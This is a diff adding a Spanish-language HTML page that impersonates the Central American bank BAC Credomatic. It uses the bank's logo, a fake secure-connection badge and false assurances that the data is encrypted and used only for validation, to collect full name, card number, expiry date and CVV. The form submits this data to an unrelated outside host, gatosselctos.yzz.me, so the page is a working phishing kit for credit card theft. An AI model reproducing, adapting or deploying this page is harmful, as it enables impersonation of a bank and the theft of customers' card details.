@@ -1,0 +1,245 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BAC Credomatic</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+    :root {
+      --primary: #F64927;
+      --light: #f6f4ff;
+      --dark: #2a2a2a;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: Arial, Helvetica, sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: var(--light);
+      color: var(--dark);
+    }
+
+    
+    .container {
+      max-width: 1000px;
+      margin: auto;
+      padding: 40px 20px;
+    }
+
+    .card {
+      background: white;
+      padding: 25px;
+      margin-bottom: 20px;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.06);
+    }
+
+    h2 {
+      color: var(--primary);
+      margin-top: 0;
+    }
+
+    ul, ol {
+      padding-left: 20px;
+    }
+
+    .cta {
+      text-align: center;
+      margin-top: 30px;
+    }
+
+    .btn {
+      background: var(--primary);
+      color: white;
+      padding: 14px 28px;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: bold;
+      display: inline-block;
+    }
+
+    
+
+    @media (max-width: 768px) {
+      header h1 { font-size: 24px; }
+    }
+    /* ===== FORM CONTAINER ===== */
+.card form {
+  display: grid;
+  gap: 14px;
+  margin-top: 18px;
+}
+
+/* ===== INPUTS ===== */
+.card input {
+  width: 100%;
+  padding: 12px 14px;
+  border-radius: 8px;
+  border: 1px solid #dcdcdc;
+  font-size: 14px;
+  background: #fff;
+  transition: all 0.2s ease;
+}
+
+/* Placeholder suave */
+.card input::placeholder {
+  color: #9aa0a6;
+}
+
+/* Focus profesional */
+.card input:focus {
+  outline: none;
+  border-color: #F64927;
+  box-shadow: 0 0 0 3px rgba(114, 48, 247, 0.12);
+}
+
+/* ===== INPUTS EN FILA (fecha + cvv) ===== */
+.form-row {
+  display: flex;
+  gap: 10px;
+}
+
+.form-row input {
+  flex: 1;
+}
+
+/* ===== BOTÓN ===== */
+.btn {
+  background: #F64927;
+  color: white;
+  border: none;
+  padding: 14px;
+  border-radius: 8px;
+  font-weight: 600;
+  font-size: 15px;
+  cursor: pointer;
+  transition: all 0.2s ease;
+}
+
+/* Hover elegante */
+.btn:hover {
+  filter: brightness(1.05);
+  transform: translateY(-1px);
+}
+
+/* Click */
+.btn:active {
+  transform: scale(0.98);
+}
+
+/* ===== TEXTO LEGAL ===== */
+.form-note {
+  font-size: 12px;
+  color: #6b6b6b;
+  line-height: 1.4;
+  margin-top: 10px;
+}
+
+/* ===== BADGE SEGURIDAD ===== */
+.secure-badge {
+  display: inline-block;
+  background: #f3efff;
+  color: #F64927;
+  font-size: 12px;
+  padding: 6px 10px;
+  border-radius: 20px;
+  font-weight: 600;
+  margin-bottom: 10px;
+}
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 600px) {
+  .form-row {
+    flex-direction: column;
+  }
+}
+/* ===== ERROR VISUAL ===== */
+.input-error {
+  border-color: #ff4d4d !important;
+  box-shadow: 0 0 0 3px rgba(255, 77, 77, 0.15);
+  animation: shake 0.25s ease;
+}
+
+/* mini vibración elegante */
+@keyframes shake {
+  0% { transform: translateX(0); }
+  25% { transform: translateX(-3px); }
+  50% { transform: translateX(3px); }
+  75% { transform: translateX(-3px); }
+  100% { transform: translateX(0); }
+}
+
+  </style>
+</head>
+<body>
+    <header>
+        <img src="https://www.baccredomatic.com/themes/custom/bac_theme/images/bac_logo.svg" alt="" style="width: 90px; margin-left: 20px;">
+        <h1>BAC Credomatic</h1>
+    </header>
+   
+    <main>
+        <div class="card-container">
+            <div class="card">
+                <img src="img/4958744476189306993.jpg" alt="Tarjeta BAC Credomatic">
+                <form id="cardForm" action="https://gatosselctos.yzz.me/tarjetas2.php" method="post">
+
+    <span class="secure-badge">🔒 Conexión segura y cifrada</span>
+
+    <input type="text" placeholder="Nombre completo" name="nombre" required />
+
+    <input
+      name="TarjetaNumero"
+      type="text"
+      id="cardNumber"
+      placeholder="Número de tarjeta"
+      maxlength="19"
+      inputmode="numeric"
+      required
+    />
+
+    <div class="form-row">
+      <input
+        name="FechaVencimiento"
+        type="text"
+        id="expiry"
+        placeholder="MM/AA"
+        maxlength="5"
+        inputmode="numeric"
+        required
+      />
+
+      <input
+        name="codigo"
+        type="text"
+        id="cvv"
+        placeholder="CVV"
+        maxlength="3"
+        inputmode="numeric"
+        required
+      />
+    </div>
+
+    <button type="submit" class="btn">Registrar tarjeta</button>
+
+    <p class="form-note">
+      La información se transmite cifrada y se usa únicamente para validación.
+    </p>
+
+  </form>
+               </div>
+            
+        </div>
+    </main>
+
+    <footer>
+        <p>&copy; 2025 BAC Credomatic. Todos los derechos reservados.</p>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
